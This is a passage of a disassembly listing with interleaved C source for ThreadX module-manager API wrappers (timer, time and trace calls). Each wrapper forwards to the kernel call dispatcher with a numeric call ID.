    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_WAIT_ABORT_CALL, (ALIGN_TYPE) thread_ptr, 0, 0);
 8021440:	4b07      	ldr	r3, [pc, #28]	; (8021460 <_txe_thread_wait_abort+0x28>)
 8021442:	f859 3003 	ldr.w	r3, [r9, r3]
 8021446:	681c      	ldr	r4, [r3, #0]
 8021448:	6879      	ldr	r1, [r7, #4]
 802144a:	2300      	movs	r3, #0
 802144c:	2200      	movs	r2, #0
 802144e:	2048      	movs	r0, #72	; 0x48
 8021450:	47a0      	blx	r4
 8021452:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8021454:	68fb      	ldr	r3, [r7, #12]
}
 8021456:	4618      	mov	r0, r3
 8021458:	3714      	adds	r7, #20
 802145a:	46bd      	mov	sp, r7
 802145c:	bd90      	pop	{r4, r7, pc}
 802145e:	bf00      	nop
 8021460:	00000004 	.word	0x00000004

08021464 <_tx_time_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
ULONG _tx_time_get(VOID)
{
 8021464:	b590      	push	{r4, r7, lr}
 8021466:	b083      	sub	sp, #12
 8021468:	af00      	add	r7, sp, #0

ULONG return_value;

    /* Call module manager dispatcher.  */
    return_value = (ULONG) (_txm_module_kernel_call_dispatcher)(TXM_TIME_GET_CALL, 0, 0, 0);
 802146a:	4b07      	ldr	r3, [pc, #28]	; (8021488 <_tx_time_get+0x24>)
 802146c:	f859 3003 	ldr.w	r3, [r9, r3]
 8021470:	681c      	ldr	r4, [r3, #0]
 8021472:	2300      	movs	r3, #0
 8021474:	2200      	movs	r2, #0
 8021476:	2100      	movs	r1, #0
 8021478:	2049      	movs	r0, #73	; 0x49
 802147a:	47a0      	blx	r4
 802147c:	6078      	str	r0, [r7, #4]

    /* Return value to the caller.  */
    return(return_value);
 802147e:	687b      	ldr	r3, [r7, #4]
}
 8021480:	4618      	mov	r0, r3
 8021482:	370c      	adds	r7, #12
 8021484:	46bd      	mov	sp, r7
 8021486:	bd90      	pop	{r4, r7, pc}
 8021488:	00000004 	.word	0x00000004

0802148c <_tx_time_set>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
VOID _tx_time_set(ULONG new_time)
{
 802148c:	b590      	push	{r4, r7, lr}
 802148e:	b083      	sub	sp, #12
 8021490:	af00      	add	r7, sp, #0
 8021492:	6078      	str	r0, [r7, #4]


    /* Call module manager dispatcher.  */
    (_txm_module_kernel_call_dispatcher)(TXM_TIME_SET_CALL, (ALIGN_TYPE) new_time, 0, 0);
 8021494:	4b06      	ldr	r3, [pc, #24]	; (80214b0 <_tx_time_set+0x24>)
 8021496:	f859 3003 	ldr.w	r3, [r9, r3]
 802149a:	681c      	ldr	r4, [r3, #0]
 802149c:	2300      	movs	r3, #0
 802149e:	2200      	movs	r2, #0
 80214a0:	6879      	ldr	r1, [r7, #4]
 80214a2:	204a      	movs	r0, #74	; 0x4a
 80214a4:	47a0      	blx	r4
}
 80214a6:	bf00      	nop
 80214a8:	370c      	adds	r7, #12
 80214aa:	46bd      	mov	sp, r7
 80214ac:	bd90      	pop	{r4, r7, pc}
 80214ae:	bf00      	nop
 80214b0:	00000004 	.word	0x00000004

080214b4 <_txe_timer_activate>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_timer_activate(TX_TIMER *timer_ptr)
{
 80214b4:	b590      	push	{r4, r7, lr}
 80214b6:	b085      	sub	sp, #20
 80214b8:	af00      	add	r7, sp, #0
 80214ba:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_TIMER_ACTIVATE_CALL, (ALIGN_TYPE) timer_ptr, 0, 0);
 80214bc:	4b07      	ldr	r3, [pc, #28]	; (80214dc <_txe_timer_activate+0x28>)
 80214be:	f859 3003 	ldr.w	r3, [r9, r3]
 80214c2:	681c      	ldr	r4, [r3, #0]
 80214c4:	6879      	ldr	r1, [r7, #4]
 80214c6:	2300      	movs	r3, #0
 80214c8:	2200      	movs	r2, #0
 80214ca:	204b      	movs	r0, #75	; 0x4b
 80214cc:	47a0      	blx	r4
 80214ce:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 80214d0:	68fb      	ldr	r3, [r7, #12]
}
 80214d2:	4618      	mov	r0, r3
 80214d4:	3714      	adds	r7, #20
 80214d6:	46bd      	mov	sp, r7
 80214d8:	bd90      	pop	{r4, r7, pc}
 80214da:	bf00      	nop
 80214dc:	00000004 	.word	0x00000004

080214e0 <_txe_timer_change>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_timer_change(TX_TIMER *timer_ptr, ULONG initial_ticks, ULONG reschedule_ticks)
{
 80214e0:	b590      	push	{r4, r7, lr}
 80214e2:	b087      	sub	sp, #28
 80214e4:	af00      	add	r7, sp, #0
 80214e6:	60f8      	str	r0, [r7, #12]
 80214e8:	60b9      	str	r1, [r7, #8]
 80214ea:	607a      	str	r2, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_TIMER_CHANGE_CALL, (ALIGN_TYPE) timer_ptr, (ALIGN_TYPE) initial_ticks, (ALIGN_TYPE) reschedule_ticks);
 80214ec:	4b07      	ldr	r3, [pc, #28]	; (802150c <_txe_timer_change+0x2c>)
 80214ee:	f859 3003 	ldr.w	r3, [r9, r3]
 80214f2:	681c      	ldr	r4, [r3, #0]
 80214f4:	68f9      	ldr	r1, [r7, #12]
 80214f6:	687b      	ldr	r3, [r7, #4]
 80214f8:	68ba      	ldr	r2, [r7, #8]
 80214fa:	204c      	movs	r0, #76	; 0x4c
 80214fc:	47a0      	blx	r4
 80214fe:	6178      	str	r0, [r7, #20]

    /* Return value to the caller.  */
    return(return_value);
 8021500:	697b      	ldr	r3, [r7, #20]
}
 8021502:	4618      	mov	r0, r3
 8021504:	371c      	adds	r7, #28
 8021506:	46bd      	mov	sp, r7
 8021508:	bd90      	pop	{r4, r7, pc}
 802150a:	bf00      	nop
 802150c:	00000004 	.word	0x00000004

08021510 <_txe_timer_create>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_timer_create(TX_TIMER *timer_ptr, CHAR *name_ptr, VOID (*expiration_function)(ULONG), ULONG expiration_input, ULONG initial_ticks, ULONG reschedule_ticks, UINT auto_activate, UINT timer_control_block_size)
{
 8021510:	b590      	push	{r4, r7, lr}
 8021512:	b08d      	sub	sp, #52	; 0x34
 8021514:	af00      	add	r7, sp, #0
 8021516:	60f8      	str	r0, [r7, #12]
 8021518:	60b9      	str	r1, [r7, #8]
 802151a:	607a      	str	r2, [r7, #4]
 802151c:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[6];

    extra_parameters[0] = (ALIGN_TYPE) expiration_function;
 802151e:	687b      	ldr	r3, [r7, #4]
 8021520:	617b      	str	r3, [r7, #20]
    extra_parameters[1] = (ALIGN_TYPE) expiration_input;
 8021522:	683b      	ldr	r3, [r7, #0]
 8021524:	61bb      	str	r3, [r7, #24]
    extra_parameters[2] = (ALIGN_TYPE) initial_ticks;
 8021526:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 8021528:	61fb      	str	r3, [r7, #28]
    extra_parameters[3] = (ALIGN_TYPE) reschedule_ticks;
 802152a:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 802152c:	623b      	str	r3, [r7, #32]
    extra_parameters[4] = (ALIGN_TYPE) auto_activate;
 802152e:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 8021530:	627b      	str	r3, [r7, #36]	; 0x24
    extra_parameters[5] = (ALIGN_TYPE) timer_control_block_size;
 8021532:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
 8021534:	62bb      	str	r3, [r7, #40]	; 0x28

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_TIMER_CREATE_CALL, (ALIGN_TYPE) timer_ptr, (ALIGN_TYPE) name_ptr, (ALIGN_TYPE) extra_parameters);
 8021536:	4b08      	ldr	r3, [pc, #32]	; (8021558 <_txe_timer_create+0x48>)
 8021538:	f859 3003 	ldr.w	r3, [r9, r3]
 802153c:	681c      	ldr	r4, [r3, #0]
 802153e:	68f9      	ldr	r1, [r7, #12]
 8021540:	68ba      	ldr	r2, [r7, #8]
 8021542:	f107 0314 	add.w	r3, r7, #20
 8021546:	204d      	movs	r0, #77	; 0x4d
 8021548:	47a0      	blx	r4
 802154a:	62f8      	str	r0, [r7, #44]	; 0x2c

    /* Return value to the caller.  */
    return(return_value);
 802154c:	6afb      	ldr	r3, [r7, #44]	; 0x2c
}
 802154e:	4618      	mov	r0, r3
 8021550:	3734      	adds	r7, #52	; 0x34
 8021552:	46bd      	mov	sp, r7
 8021554:	bd90      	pop	{r4, r7, pc}
 8021556:	bf00      	nop
 8021558:	00000004 	.word	0x00000004

0802155c <_txe_timer_deactivate>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_timer_deactivate(TX_TIMER *timer_ptr)
{
 802155c:	b590      	push	{r4, r7, lr}
 802155e:	b085      	sub	sp, #20
 8021560:	af00      	add	r7, sp, #0
 8021562:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_TIMER_DEACTIVATE_CALL, (ALIGN_TYPE) timer_ptr, 0, 0);
 8021564:	4b07      	ldr	r3, [pc, #28]	; (8021584 <_txe_timer_deactivate+0x28>)
 8021566:	f859 3003 	ldr.w	r3, [r9, r3]
 802156a:	681c      	ldr	r4, [r3, #0]
 802156c:	6879      	ldr	r1, [r7, #4]
 802156e:	2300      	movs	r3, #0
 8021570:	2200      	movs	r2, #0
 8021572:	204e      	movs	r0, #78	; 0x4e
 8021574:	47a0      	blx	r4
 8021576:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8021578:	68fb      	ldr	r3, [r7, #12]
}
 802157a:	4618      	mov	r0, r3
 802157c:	3714      	adds	r7, #20
 802157e:	46bd      	mov	sp, r7
 8021580:	bd90      	pop	{r4, r7, pc}
 8021582:	bf00      	nop
 8021584:	00000004 	.word	0x00000004

08021588 <_txe_timer_delete>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_timer_delete(TX_TIMER *timer_ptr)
{
 8021588:	b590      	push	{r4, r7, lr}
 802158a:	b085      	sub	sp, #20
 802158c:	af00      	add	r7, sp, #0
 802158e:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_TIMER_DELETE_CALL, (ALIGN_TYPE) timer_ptr, 0, 0);
 8021590:	4b07      	ldr	r3, [pc, #28]	; (80215b0 <_txe_timer_delete+0x28>)
 8021592:	f859 3003 	ldr.w	r3, [r9, r3]
 8021596:	681c      	ldr	r4, [r3, #0]
 8021598:	6879      	ldr	r1, [r7, #4]
 802159a:	2300      	movs	r3, #0
 802159c:	2200      	movs	r2, #0
 802159e:	204f      	movs	r0, #79	; 0x4f
 80215a0:	47a0      	blx	r4
 80215a2:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 80215a4:	68fb      	ldr	r3, [r7, #12]
}
 80215a6:	4618      	mov	r0, r3
 80215a8:	3714      	adds	r7, #20
 80215aa:	46bd      	mov	sp, r7
 80215ac:	bd90      	pop	{r4, r7, pc}
 80215ae:	bf00      	nop
 80215b0:	00000004 	.word	0x00000004

080215b4 <_txe_timer_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_timer_info_get(TX_TIMER *timer_ptr, CHAR **name, UINT *active, ULONG *remaining_ticks, ULONG *reschedule_ticks, TX_TIMER **next_timer)
{
 80215b4:	b590      	push	{r4, r7, lr}
 80215b6:	b08b      	sub	sp, #44	; 0x2c
 80215b8:	af00      	add	r7, sp, #0
 80215ba:	60f8      	str	r0, [r7, #12]
 80215bc:	60b9      	str	r1, [r7, #8]
 80215be:	607a      	str	r2, [r7, #4]
 80215c0:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[4];

    extra_parameters[0] = (ALIGN_TYPE) active;
 80215c2:	687b      	ldr	r3, [r7, #4]
 80215c4:	617b      	str	r3, [r7, #20]
    extra_parameters[1] = (ALIGN_TYPE) remaining_ticks;
 80215c6:	683b      	ldr	r3, [r7, #0]
 80215c8:	61bb      	str	r3, [r7, #24]
    extra_parameters[2] = (ALIGN_TYPE) reschedule_ticks;
 80215ca:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 80215cc:	61fb      	str	r3, [r7, #28]
    extra_parameters[3] = (ALIGN_TYPE) next_timer;
 80215ce:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 80215d0:	623b      	str	r3, [r7, #32]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_TIMER_INFO_GET_CALL, (ALIGN_TYPE) timer_ptr, (ALIGN_TYPE) name, (ALIGN_TYPE) extra_parameters);
 80215d2:	4b08      	ldr	r3, [pc, #32]	; (80215f4 <_txe_timer_info_get+0x40>)
 80215d4:	f859 3003 	ldr.w	r3, [r9, r3]
 80215d8:	681c      	ldr	r4, [r3, #0]
 80215da:	68f9      	ldr	r1, [r7, #12]
 80215dc:	68ba      	ldr	r2, [r7, #8]
 80215de:	f107 0314 	add.w	r3, r7, #20
 80215e2:	2050      	movs	r0, #80	; 0x50
 80215e4:	47a0      	blx	r4
 80215e6:	6278      	str	r0, [r7, #36]	; 0x24

    /* Return value to the caller.  */
    return(return_value);
 80215e8:	6a7b      	ldr	r3, [r7, #36]	; 0x24
}
 80215ea:	4618      	mov	r0, r3
 80215ec:	372c      	adds	r7, #44	; 0x2c
 80215ee:	46bd      	mov	sp, r7
 80215f0:	bd90      	pop	{r4, r7, pc}
 80215f2:	bf00      	nop
 80215f4:	00000004 	.word	0x00000004

080215f8 <_tx_timer_performance_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_timer_performance_info_get(TX_TIMER *timer_ptr, ULONG *activates, ULONG *reactivates, ULONG *deactivates, ULONG *expirations, ULONG *expiration_adjusts)
{
 80215f8:	b590      	push	{r4, r7, lr}
 80215fa:	b08b      	sub	sp, #44	; 0x2c
 80215fc:	af00      	add	r7, sp, #0
 80215fe:	60f8      	str	r0, [r7, #12]
 8021600:	60b9      	str	r1, [r7, #8]
 8021602:	607a      	str	r2, [r7, #4]
 8021604:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[4];

    extra_parameters[0] = (ALIGN_TYPE) reactivates;
 8021606:	687b      	ldr	r3, [r7, #4]
 8021608:	617b      	str	r3, [r7, #20]
    extra_parameters[1] = (ALIGN_TYPE) deactivates;
 802160a:	683b      	ldr	r3, [r7, #0]
 802160c:	61bb      	str	r3, [r7, #24]
    extra_parameters[2] = (ALIGN_TYPE) expirations;
 802160e:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8021610:	61fb      	str	r3, [r7, #28]
    extra_parameters[3] = (ALIGN_TYPE) expiration_adjusts;
 8021612:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8021614:	623b      	str	r3, [r7, #32]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_TIMER_PERFORMANCE_INFO_GET_CALL, (ALIGN_TYPE) timer_ptr, (ALIGN_TYPE) activates, (ALIGN_TYPE) extra_parameters);
 8021616:	4b08      	ldr	r3, [pc, #32]	; (8021638 <_tx_timer_performance_info_get+0x40>)
 8021618:	f859 3003 	ldr.w	r3, [r9, r3]
 802161c:	681c      	ldr	r4, [r3, #0]
 802161e:	68f9      	ldr	r1, [r7, #12]
 8021620:	68ba      	ldr	r2, [r7, #8]
 8021622:	f107 0314 	add.w	r3, r7, #20
 8021626:	2051      	movs	r0, #81	; 0x51
 8021628:	47a0      	blx	r4
 802162a:	6278      	str	r0, [r7, #36]	; 0x24

    /* Return value to the caller.  */
    return(return_value);
 802162c:	6a7b      	ldr	r3, [r7, #36]	; 0x24
}
 802162e:	4618      	mov	r0, r3
 8021630:	372c      	adds	r7, #44	; 0x2c
 8021632:	46bd      	mov	sp, r7
 8021634:	bd90      	pop	{r4, r7, pc}
 8021636:	bf00      	nop
 8021638:	00000004 	.word	0x00000004

0802163c <_tx_timer_performance_system_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_timer_performance_system_info_get(ULONG *activates, ULONG *reactivates, ULONG *deactivates, ULONG *expirations, ULONG *expiration_adjusts)
{
 802163c:	b590      	push	{r4, r7, lr}
 802163e:	b089      	sub	sp, #36	; 0x24
 8021640:	af00      	add	r7, sp, #0
 8021642:	60f8      	str	r0, [r7, #12]
 8021644:	60b9      	str	r1, [r7, #8]
 8021646:	607a      	str	r2, [r7, #4]
 8021648:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[3];

    extra_parameters[0] = (ALIGN_TYPE) deactivates;
 802164a:	687b      	ldr	r3, [r7, #4]
 802164c:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) expirations;
 802164e:	683b      	ldr	r3, [r7, #0]
 8021650:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) expiration_adjusts;
 8021652:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8021654:	61bb      	str	r3, [r7, #24]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_TIMER_PERFORMANCE_SYSTEM_INFO_GET_CALL, (ALIGN_TYPE) activates, (ALIGN_TYPE) reactivates, (ALIGN_TYPE) extra_parameters);
 8021656:	4b08      	ldr	r3, [pc, #32]	; (8021678 <_tx_timer_performance_system_info_get+0x3c>)
 8021658:	f859 3003 	ldr.w	r3, [r9, r3]
 802165c:	681c      	ldr	r4, [r3, #0]
 802165e:	68f9      	ldr	r1, [r7, #12]
 8021660:	68ba      	ldr	r2, [r7, #8]
 8021662:	f107 0310 	add.w	r3, r7, #16
 8021666:	2052      	movs	r0, #82	; 0x52
 8021668:	47a0      	blx	r4
 802166a:	61f8      	str	r0, [r7, #28]

    /* Return value to the caller.  */
    return(return_value);
 802166c:	69fb      	ldr	r3, [r7, #28]
}
 802166e:	4618      	mov	r0, r3
 8021670:	3724      	adds	r7, #36	; 0x24
 8021672:	46bd      	mov	sp, r7
 8021674:	bd90      	pop	{r4, r7, pc}
 8021676:	bf00      	nop
 8021678:	00000004 	.word	0x00000004

0802167c <_tx_trace_buffer_full_notify>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_trace_buffer_full_notify(VOID (*full_buffer_callback)(VOID *buffer))
{
 802167c:	b590      	push	{r4, r7, lr}
 802167e:	b085      	sub	sp, #20
 8021680:	af00      	add	r7, sp, #0
 8021682:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_TRACE_BUFFER_FULL_NOTIFY_CALL, (ALIGN_TYPE) full_buffer_callback, 0, 0);
 8021684:	4b07      	ldr	r3, [pc, #28]	; (80216a4 <_tx_trace_buffer_full_notify+0x28>)
 8021686:	f859 3003 	ldr.w	r3, [r9, r3]
 802168a:	681c      	ldr	r4, [r3, #0]
 802168c:	6879      	ldr	r1, [r7, #4]
 802168e:	2300      	movs	r3, #0
 8021690:	2200      	movs	r2, #0
 8021692:	205a      	movs	r0, #90	; 0x5a
 8021694:	47a0      	blx	r4
 8021696:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8021698:	68fb      	ldr	r3, [r7, #12]
}
 802169a:	4618      	mov	r0, r3
 802169c:	3714      	adds	r7, #20
 802169e:	46bd      	mov	sp, r7
 80216a0:	bd90      	pop	{r4, r7, pc}
 80216a2:	bf00      	nop
 80216a4:	00000004 	.word	0x00000004

080216a8 <_tx_trace_disable>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_trace_disable(VOID)
{
 80216a8:	b590      	push	{r4, r7, lr}
 80216aa:	b083      	sub	sp, #12
 80216ac:	af00      	add	r7, sp, #0

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_TRACE_DISABLE_CALL, 0, 0, 0);
 80216ae:	4b07      	ldr	r3, [pc, #28]	; (80216cc <_tx_trace_disable+0x24>)
 80216b0:	f859 3003 	ldr.w	r3, [r9, r3]
 80216b4:	681c      	ldr	r4, [r3, #0]
 80216b6:	2300      	movs	r3, #0
 80216b8:	2200      	movs	r2, #0
 80216ba:	2100      	movs	r1, #0
 80216bc:	2056      	movs	r0, #86	; 0x56
 80216be:	47a0      	blx	r4
 80216c0:	6078      	str	r0, [r7, #4]

    /* Return value to the caller.  */
    return(return_value);
 80216c2:	687b      	ldr	r3, [r7, #4]
}
 80216c4:	4618      	mov	r0, r3
 80216c6:	370c      	adds	r7, #12
 80216c8:	46bd      	mov	sp, r7
 80216ca:	bd90      	pop	{r4, r7, pc}
 80216cc:	00000004 	.word	0x00000004

080216d0 <_tx_trace_enable>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_trace_enable(VOID *trace_buffer_start, ULONG trace_buffer_size, ULONG registry_entries)
{
 80216d0:	b590      	push	{r4, r7, lr}
 80216d2:	b087      	sub	sp, #28
 80216d4:	af00      	add	r7, sp, #0
 80216d6:	60f8      	str	r0, [r7, #12]
 80216d8:	60b9      	str	r1, [r7, #8]
 80216da:	607a      	str	r2, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_TRACE_ENABLE_CALL, (ALIGN_TYPE) trace_buffer_start, (ALIGN_TYPE) trace_buffer_size, (ALIGN_TYPE) registry_entries);
 80216dc:	4b07      	ldr	r3, [pc, #28]	; (80216fc <_tx_trace_enable+0x2c>)
 80216de:	f859 3003 	ldr.w	r3, [r9, r3]
 80216e2:	681c      	ldr	r4, [r3, #0]
 80216e4:	68f9      	ldr	r1, [r7, #12]
 80216e6:	687b      	ldr	r3, [r7, #4]
 80216e8:	68ba      	ldr	r2, [r7, #8]
 80216ea:	2053      	movs	r0, #83	; 0x53
 80216ec:	47a0      	blx	r4
 80216ee:	6178      	str	r0, [r7, #20]

    /* Return value to the caller.  */
    return(return_value);
 80216f0:	697b      	ldr	r3, [r7, #20]
}
 80216f2:	4618      	mov	r0, r3
 80216f4:	371c      	adds	r7, #28
 80216f6:	46bd      	mov	sp, r7
 80216f8:	bd90      	pop	{r4, r7, pc}
 80216fa:	bf00      	nop
 80216fc:	00000004 	.word	0x00000004

08021700 <_tx_trace_event_filter>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_trace_event_filter(ULONG event_filter_bits)
{
 8021700:	b590      	push	{r4, r7, lr}
 8021702:	b085      	sub	sp, #20
 8021704:	af00      	add	r7, sp, #0
 8021706:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_TRACE_EVENT_FILTER_CALL, (ALIGN_TYPE) event_filter_bits, 0, 0);
 8021708:	4b07      	ldr	r3, [pc, #28]	; (8021728 <_tx_trace_event_filter+0x28>)
 802170a:	f859 3003 	ldr.w	r3, [r9, r3]
 802170e:	681c      	ldr	r4, [r3, #0]
 8021710:	2300      	movs	r3, #0
 8021712:	2200      	movs	r2, #0
 8021714:	6879      	ldr	r1, [r7, #4]
 8021716:	2054      	movs	r0, #84	; 0x54
 8021718:	47a0      	blx	r4
 802171a:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 802171c:	68fb      	ldr	r3, [r7, #12]
}
 802171e:	4618      	mov	r0, r3
 8021720:	3714      	adds	r7, #20
 8021722:	46bd      	mov	sp, r7
 8021724:	bd90      	pop	{r4, r7, pc}
 8021726:	bf00      	nop
 8021728:	00000004 	.word	0x00000004

0802172c <_tx_trace_event_unfilter>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_trace_event_unfilter(ULONG event_unfilter_bits)
{
 802172c:	b590      	push	{r4, r7, lr}
 802172e:	b085      	sub	sp, #20
 8021730:	af00      	add	r7, sp, #0
 8021732:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_TRACE_EVENT_UNFILTER_CALL, (ALIGN_TYPE) event_unfilter_bits, 0, 0);
 8021734:	4b07      	ldr	r3, [pc, #28]	; (8021754 <_tx_trace_event_unfilter+0x28>)
 8021736:	f859 3003 	ldr.w	r3, [r9, r3]
 802173a:	681c      	ldr	r4, [r3, #0]
 802173c:	2300      	movs	r3, #0
 802173e:	2200      	movs	r2, #0
 8021740:	6879      	ldr	r1, [r7, #4]
 8021742:	2055      	movs	r0, #85	; 0x55
 8021744:	47a0      	blx	r4
 8021746:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8021748:	68fb      	ldr	r3, [r7, #12]
}
 802174a:	4618      	mov	r0, r3
 802174c:	3714      	adds	r7, #20
 802174e:	46bd      	mov	sp, r7
 8021750:	bd90      	pop	{r4, r7, pc}
 8021752:	bf00      	nop
 8021754:	00000004 	.word	0x00000004

08021758 <_tx_trace_interrupt_control>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_trace_interrupt_control(UINT new_posture)
{
 8021758:	b590      	push	{r4, r7, lr}
 802175a:	b085      	sub	sp, #20
 802175c:	af00      	add	r7, sp, #0
 802175e:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_TRACE_INTERRUPT_CONTROL_CALL, (ALIGN_TYPE) new_posture, 0, 0);
 8021760:	4b07      	ldr	r3, [pc, #28]	; (8021780 <_tx_trace_interrupt_control+0x28>)
 8021762:	f859 3003 	ldr.w	r3, [r9, r3]
 8021766:	681c      	ldr	r4, [r3, #0]
 8021768:	2300      	movs	r3, #0
 802176a:	2200      	movs	r2, #0
 802176c:	6879      	ldr	r1, [r7, #4]
 802176e:	2057      	movs	r0, #87	; 0x57
 8021770:	47a0      	blx	r4
 8021772:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8021774:	68fb      	ldr	r3, [r7, #12]
}
 8021776:	4618      	mov	r0, r3
 8021778:	3714      	adds	r7, #20
 802177a:	46bd      	mov	sp, r7
 802177c:	bd90      	pop	{r4, r7, pc}
 802177e:	bf00      	nop
 8021780:	00000004 	.word	0x00000004

08021784 <_tx_trace_isr_enter_insert>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
VOID _tx_trace_isr_enter_insert(ULONG isr_id)
{
 8021784:	b590      	push	{r4, r7, lr}
 8021786:	b083      	sub	sp, #12
 8021788:	af00      	add	r7, sp, #0
 802178a:	6078      	str	r0, [r7, #4]


    /* Call module manager dispatcher.  */
    (_txm_module_kernel_call_dispatcher)(TXM_TRACE_ISR_ENTER_INSERT_CALL, (ALIGN_TYPE) isr_id, 0, 0);
 802178c:	4b06      	ldr	r3, [pc, #24]	; (80217a8 <_tx_trace_isr_enter_insert+0x24>)
 802178e:	f859 3003 	ldr.w	r3, [r9, r3]
 8021792:	681c      	ldr	r4, [r3, #0]
 8021794:	2300      	movs	r3, #0
 8021796:	2200      	movs	r2, #0
 8021798:	6879      	ldr	r1, [r7, #4]
 802179a:	2058      	movs	r0, #88	; 0x58
 802179c:	47a0      	blx	r4
}
 802179e:	bf00      	nop
 80217a0:	370c      	adds	r7, #12
 80217a2:	46bd      	mov	sp, r7
 80217a4:	bd90      	pop	{r4, r7, pc}
 80217a6:	bf00      	nop
 80217a8:	00000004 	.word	0x00000004

080217ac <_tx_trace_isr_exit_insert>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
VOID _tx_trace_isr_exit_insert(ULONG isr_id)
{
 80217ac:	b590      	push	{r4, r7, lr}
 80217ae:	b083      	sub	sp, #12
 80217b0:	af00      	add	r7, sp, #0
 80217b2:	6078      	str	r0, [r7, #4]


    /* Call module manager dispatcher.  */
    (_txm_module_kernel_call_dispatcher)(TXM_TRACE_ISR_EXIT_INSERT_CALL, (ALIGN_TYPE) isr_id, 0, 0);
